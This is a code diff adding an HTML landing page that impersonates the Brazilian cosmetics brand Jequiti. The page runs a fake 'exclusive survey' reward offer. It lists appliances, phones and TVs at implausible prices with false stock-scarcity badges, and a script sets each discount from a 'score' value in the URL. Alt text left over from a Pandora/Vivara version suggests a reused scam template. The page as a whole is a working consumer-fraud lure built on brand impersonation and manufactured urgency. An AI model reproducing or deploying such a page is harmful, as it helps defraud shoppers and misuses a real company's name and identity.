@@ -1,0 +1,361 @@
+<!---CAUÃDEV--->
+
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>JEQUITI | COM VOCÊ</title>
+    <script src="js/latest.js" async="" defer=""></script>
+    <link rel="stylesheet" href="css/products.css">
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="stylesheet" href="css/fonts.css">
+    <link rel="stylesheet"
+          href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0">
+    <style>
+        body {
+            font-family: 'GellixRegular', sans-serif;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px;
+            background-color: #fff;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .navbar img {
+            height: 5vh;
+        }
+
+        .navbar .menu-icon span {
+            font-size: 30px;
+            color: #7A206C;
+            margin-right: 10px;
+            cursor: pointer;
+        }
+
+        .banner img {
+            width: 100%;
+            display: block;
+        }
+
+        .title {
+            text-align: center;
+            font-family: 'GellixSemiBold', sans-serif;
+            font-size: 24px;
+            color: #7A206C;
+            padding: 20px 0;
+        }
+
+        .bracelet-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .bracelet-item {
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+            background-color: #fff;
+        }
+
+        .bracelet-item:hover {
+            transform: scale(1.02);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
+        }
+
+        .bracelet-item img {
+            width: 100%;
+            border-radius: 12px;
+        }
+
+        .nome {
+            font-size: 18px;
+            font-weight: 700;
+            margin: 15px 0;
+            color: #333;
+        }
+
+        .percentual-desconto {
+            background-color: #f0f0f0;
+            color: #d32f2f;
+            border-radius: 8px;
+            padding: 6px 12px;
+            font-size: 14px;
+            font-weight: 500;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            display: inline-block;
+        }
+
+        .old {
+            text-decoration: line-through;
+            color: #888;
+            font-size: 16px;
+        }
+
+        .new {
+            color: #d32f2f;
+            font-size: 20px;
+            font-weight: 700;
+        }
+
+        .preco-desconto-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            margin-top: 10px;
+        }
+
+        .footer {
+            background-color: #f5f5f5;
+            padding: 20px;
+            text-align: center;
+            font-family: 'GellixMedium', sans-serif;
+        }
+
+        .footer p {
+            margin: 5px 0;
+            color: #002776;
+        }
+        @media (max-width: 768px) {
+            .bracelet-grid {
+                padding: 10px; /* Reduzir o padding */
+            }
+
+            .bracelet-item {
+                padding: 0px; /* Reduzir o padding */
+                max-width: 100%; /* Garantir que o item ocupe a largura total disponível */
+            }
+
+            .footer {
+                padding: 0;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .bracelet-grid {
+                padding: 5px; /* Reduzir ainda mais o padding para telas muito pequenas */
+                gap: 0; /* Diminuir o espaço entre os itens */
+            }
+
+            .bracelet-item {
+                padding: 10px; /* Reduzir ainda mais o padding */
+            }
+
+            .footer {
+                padding: 0;
+            }
+        }
+
+    </style>
+</head>
+<body>
+
+<div style="background-color: #7A206C; text-align: center; padding: 5px; font-family: 'GellixMedium'; font-size: 13px; color: #ffffff">
+    Pesquisa exclusiva: Jequiti para você
+</div>
+
+<nav class="navbar" style="padding-top: 15px;">
+    <div class="menu-icon" style="padding-left: 3%;">
+        <img src="images/logo-jequit.svg" style="height: 5vh;" alt="Logo Central Vivara">
+    </div>
+
+    <div class="logo-central">
+    </div>
+
+    <div class="menu-icon" style="padding-right: 3%;">
+        <span class="material-symbols-outlined"
+              style="font-size: 30px; padding-right: 10px; color: #7A206C">search</span>
+        <span class="material-symbols-outlined" style="font-size: 30px; padding-right: 10px; color: #7A206C">shopping_cart</span>
+        <span class="material-symbols-outlined" style="font-size: 30px; padding-right: 10px; color: #7A206C">menu</span>
+    </div>
+</nav>
+
+<img src="images/fabio.png" style="width: 100%;">
+
+<p style="text-align: center; font-family: 'GellixSemiBold'; font-size: 24px; padding-top: 0px;color: #7A206C">Resgate
+    sua recompensa!</p>
+
+<div class="bracelet-grid">
+    <div class="bracelet-item" data-preco-original="799,90"
+         onclick="window.location.href='/loja/produtos/panela/' + window.location.search;">
+        <img src="images/panela.png" alt="Jogo Completo 5 Panelas BRINOX">
+        <p class="nome">Jogo Completo 5 Panelas BRINOX</p>
+        <span style="color: #874B2E; background-color: #FFEBE3; border-radius: 12px; font-size: 13px; padding: 3px 10px;">Restam 18 unidades</span>
+        <div class="preco-desconto-container">
+            <p class="old">R$999,00</p>
+            <p class="new">R$639,90</p>
+            <p class="percentual-desconto">Desconto: 20%</p>
+        </div>
+    </div>
+
+    <div class="bracelet-item" data-preco-original="999,00"
+         onclick="window.location.href='/loja/produtos/microondas/' + window.location.search;">
+        <img src="images/microondas.png" alt="Bracelete Rígido Pandora">
+        <p class="nome">Microondas 30L 220V LG</p>
+        <span style="color: rgb(255, 46, 46); background-color: #ffdcdc; border-radius: 12px; font-size: 13px; padding: 3px 10px 3px 10px;">Restam 3 unidades</span>
+        <div class="preco-desconto-container">
+            <p class="old">R$999,00</p>
+            <p class="new">R$639,90</p> <!-- Atualize este valor conforme necessário -->
+            <p class="percentual-desconto">Desconto: 20%</p>
+        </div>
+    </div>
+
+
+    <div class="bracelet-item" data-preco-original="2199,00"
+         onclick="window.location.href='/loja/produtos/celular/' + window.location.search;">
+        <img src="images/celular.webp" alt="Bracelete Rígido Pandora">
+        <p class="nome">Samsung Galaxy S22 128Gb</p>
+        <span style="color: rgb(255, 46, 46); background-color: #ffdcdc; border-radius: 12px; font-size: 13px; padding: 3px 10px 3px 10px;">Restam 2 unidades</span>
+        <div class="preco-desconto-container">
+            <p class="old">R$999,00</p>
+            <p class="new">R$639,90</p> <!-- Atualize este valor conforme necessário -->
+            <p class="percentual-desconto">Desconto: 20%</p>
+        </div>
+    </div>
+
+
+    <div class="bracelet-item" data-preco-original="1159,00"
+         onclick="window.location.href='/loja/produtos/air/' + window.location.search;">
+        <img src="images/airfryer.png" alt="Bracelete Rígido Pandora">
+        <p class="nome">Air Fryer Britânia Oven 4em1</p>
+        <span style="color: rgb(0, 132, 18); background-color: #cbffc7; border-radius: 12px; font-size: 13px; padding: 3px 10px 3px 10px;">Restam 25 unidades</span>
+        <div class="preco-desconto-container">
+            <p class="old">R$1159,00</p>
+            <p class="new">R$639,90</p> <!-- Atualize este valor conforme necessário -->
+            <p class="percentual-desconto">Desconto: 20%</p>
+        </div>
+    </div>
+
+
+    <div class="bracelet-item" data-preco-original="1799,00"
+         onclick="window.location.href='/loja/produtos/notebook/' + window.location.search;">
+        <img src="images/notebook.png" alt="Bracelete Rígido Pandora">
+        <p class="nome">Notebook Go Samsung 1TB HD</p>
+        <span style="color: rgb(255, 46, 46); background-color: #ffdcdc; border-radius: 12px; font-size: 13px; padding: 3px 10px 3px 10px;">Restam 4 unidades</span>
+        <div class="preco-desconto-container">
+            <p class="old">R$999,00</p>
+            <p class="new">R$639,90</p> <!-- Atualize este valor conforme necessário -->
+            <p class="percentual-desconto">Desconto: 20%</p>
+        </div>
+    </div>
+
+
+    <div class="bracelet-item" data-preco-original="2499,99"
+         onclick="window.location.href='/loja/produtos/tv/' + window.location.search;">
+        <img src="images/tv.png" alt="Bracelete Rígido Pandora">
+        <p class="nome">Smart TV 50 polegadas 4K</p>
+        <span style="color: rgb(132, 121, 0); background-color: #ffffc7; border-radius: 12px; font-size: 13px; padding: 3px 10px 3px 10px;">Restam 9 unidades</span>
+        <div class="preco-desconto-container">
+            <p class="old">R$2499,99</p>
+            <p class="new">R$639,90</p> <!-- Atualize este valor conforme necessário -->
+            <p class="percentual-desconto">Desconto: 20%</p>
+        </div>
+    </div>
+</div>
+
+
+<div class="divisoria2"></div>
+
+<p style="margin-left: 3%; margin-right: 3%; font-family: 'GellixRegular'; font-size: 14px; padding-top: 5px;">
+    Copyright© 1995-2024 JEQUITI. Todos os direitos reservados.<br><br>
+
+    JEQUITI DA AMAZONIA LTDA., com sede em Av. dos Oitis, nº 1.460, Distrito Industrial, Manaus/AM, 69.007-002, inscrita
+    no CNPJ/MF sob o nº. 00.280.273/0001-37.<br><br>
+
+    Esse website é melhor visualizado nas versões Microsoft Internet Explorer 11 ou superior e/ou nas últimas versões
+    dos navegadores Google Chrome e Mozilla Firefox.<br><br>
+
+    Formas de pagamento aceitas: Pix, Cartão de crédito (Visa, MasterCard, Elo, American Express, Diners Club,
+    Hipercard, Elo), Cartão Samsung Itaú, Boleto bancário, Samsung Pay e Picpay.<br><br>
+
+    <span style="font-family: 'GellixSemiBold';">Brasil/Português</span>
+</p>
+
+<div class="footer" style="margin-top: 30px; padding-top: 1px;">
+    <p style="text-align: center; font-family: 'GellixSemiBold'; font-size: 20px; color: #002776;">Jequiti para você</p>
+    <p style="text-align: center; font-family: 'GellixMedium'; font-size: 14px; color: #002776;">© 1986 - 2024 JEQUITI S.A. | CNPJ: 07278350/0001-63 | Rod. Antônio Heil, 250 - Centro II, Brusque - SC, 88353-100</p>
+</div>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        // Função para calcular o desconto
+        function calcularDesconto(precoOriginal, precoAtual) {
+            if (precoOriginal > 0) {
+                return ((precoOriginal - precoAtual) / precoOriginal * 100).toFixed(2);
+            }
+            return 0;
+        }
+
+        // Obtém todos os itens da lista
+        document.querySelectorAll('.bracelet-item').forEach(item => {
+            // Obtém o preço original e atual
+            const precoOriginal = parseFloat(item.getAttribute('data-preco-original').replace('R$', '').replace(',', '.'));
+            const precoAtual = parseFloat(item.querySelector('.new').textContent.replace('R$', '').replace(',', '.'));
+
+            // Calcula o desconto e exibe
+            const desconto = calcularDesconto(precoOriginal, precoAtual);
+            item.querySelector('.percentual-desconto').textContent = `Desconto: ${desconto}%`;
+        });
+    });
+
+    // Função para obter o valor do 'score' da URL
+    function obterScore() {
+        const params = new URLSearchParams(window.location.search);
+        return parseFloat(params.get('score')) || 0;
+    }
+
+    // Função para formatar valores como moeda
+    function formatarMoeda(valor) {
+        return valor.toLocaleString('pt-BR', {style: 'currency', currency: 'BRL'});
+    }
+
+    // Função para ajustar os preços
+    function ajustarPrecos(score) {
+        const produtos = document.querySelectorAll('.bracelet-item');
+        produtos.forEach(produto => {
+            const precoOriginal = parseFloat(produto.getAttribute('data-preco-original').replace(',', '.'));
+
+            if (isNaN(precoOriginal)) return; // Verificar se o preço original é válido
+
+            // Calcula a porcentagem de ajuste com base no score
+            const maxScore = 700; // Máximo score
+            let descontoPercentual = Math.min((score / maxScore) * 100, 100); // Ajuste proporcional ao score
+
+            // Ajustar o novo preço com base no ajuste percentual
+            let precoDesconto = precoOriginal * (1 - (descontoPercentual / 100));
+            precoDesconto = Math.max(precoDesconto, 0); // Garantir que o preço não seja negativo
+
+            // Atualizar o preço original e o novo preço no HTML
+            produto.querySelector('.old').textContent = formatarMoeda(precoOriginal);
+            produto.querySelector('.new').textContent = formatarMoeda(precoDesconto);
+        });
+    }
+
+    // Obter o score e ajustar os preços
+    const score = obterScore();
+    ajustarPrecos(score);
+</script>
+
+</body>
+</html>
+
+<!---CAUÃDEV--->
